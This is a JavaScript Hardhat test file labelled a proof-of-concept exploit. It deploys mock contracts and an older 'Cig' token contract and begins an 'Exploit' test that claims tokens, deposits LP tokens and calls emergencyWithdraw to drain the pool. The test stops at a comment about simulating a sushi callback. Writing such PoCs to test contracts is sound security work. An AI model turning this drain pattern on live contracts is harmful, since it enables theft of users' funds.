/**
 * PoC exploit for previous contract
 */
const {expect} = require("chai");
const {ContractFactory, utils, BigNumber} = require('ethers');

describe("NewCig", function () {
    let CigToken;
    let cig;
    let OldCigToken;
    let oldcig;
    let PunkMock;
    let pm;
    let owner, simp, elizabeth;
    let PoolMock;
    let pt;
    let NFTMock;
    let nft, oldNft;
    let V2RouterMock;
    let v2;
    const BLOCK_REWARD = '5';
    const CEO_EPOCH_BLOCKS = 10;
    const CEO_AUCTION_BLOCKS = 5;
    let CEO_BUY_PRICE = '50000';
    let CEO_TAX_DEPOSIT = '5000';
    let CLAIM_AMOUNT = '100000';
    let MINT_SUPPLY = (parseInt(CLAIM_AMOUNT) * 10000) + '';
    let graffiti = "hello world";
    let graff32 = new Uint8Array(32);
    let feth = utils.formatEther;
    let peth = utils.parseEther;
    let ASSET_URL = "ipfs://2727838744/something/238374/";
    let MSV2 = '0xEF0881eC094552b2e128Cf945EF17a6752B4Ec5d'; //
    before(async function () {
        [owner, simp, elizabeth] = await ethers.getSigners();

        // deploy the punks mocking contract
        V2RouterMock = await ethers.getContractFactory("V2RouterMock");
        v2 = await V2RouterMock.deploy();
        await v2.deployed();

        PunkMock = await ethers.getContractFactory("PunkMock");
        pm = await PunkMock.deploy(owner.address);
        await pm.deployed();

        // deploy the pool mocking contract
        PoolMock = await ethers.getContractFactory("PoolTokenMock");
        pt = await PoolMock.deploy(owner.address);
        await pt.deployed();
        for (let i = 0; i < graffiti.length; i++) {
            graff32[i] = graffiti.charCodeAt(i);
        }





        // Deploy the old contract
        NFTMock = await ethers.getContractFactory("NonFungibleCEO");
        oldNft = await NFTMock.deploy(ASSET_URL);
        await oldNft.deployed();

        OldCigToken = await ethers.getContractFactory("OldCig");
        oldcig = await OldCigToken.deploy(
            100,
            utils.parseEther(BLOCK_REWARD),
            pm.address,
            CEO_EPOCH_BLOCKS,
            CEO_AUCTION_BLOCKS,
            utils.parseEther(CEO_BUY_PRICE),
            MSV2,
            graff32,
            oldNft.address,
            v2.address
        );
        await oldcig.deployed();

        // tell the NFT contract about the cig token
        await oldNft.setCigToken(oldcig.address);
        //await nft.setBaseURI(ASSET_URL); // onlyCEO

        // test burning of keys
        await oldNft.renounceOwnership();

        await expect(oldNft.setBaseURI(ASSET_URL)).to.be.revertedWith('must be called by CEO');


    });

    describe("Exploit", function () {


        it("Should drain the LP tokens", async function () {
            // set the pool
            await oldcig.setPool(pt.address);
            // get some coins
            expect(await oldcig.claim(4513))
                .to.emit(oldcig, 'Claim').withArgs(owner.address, 4513, utils.parseEther(CLAIM_AMOUNT))
                .to.emit(oldcig, 'Transfer').withArgs(pm.address, owner.address, utils.parseEther(CLAIM_AMOUNT));
            expect(await oldcig.balanceOf(owner.address)).to.equal(utils.parseEther(CLAIM_AMOUNT));

            await expect(pt.approve(oldcig.address, utils.parseEther('5'))).to.emit(pt, 'Approval');
            await expect(oldcig.deposit(utils.parseEther('5'))).to.emit(oldcig, 'Deposit');

            // call emergency withdraw
            expect(await oldcig.emergencyWithdraw()).to.emit(oldcig, "EmergencyWithdraw").withArgs(owner.address, utils.parseEther('5'));

            // now we simulate a sushi callback

        });


    });

});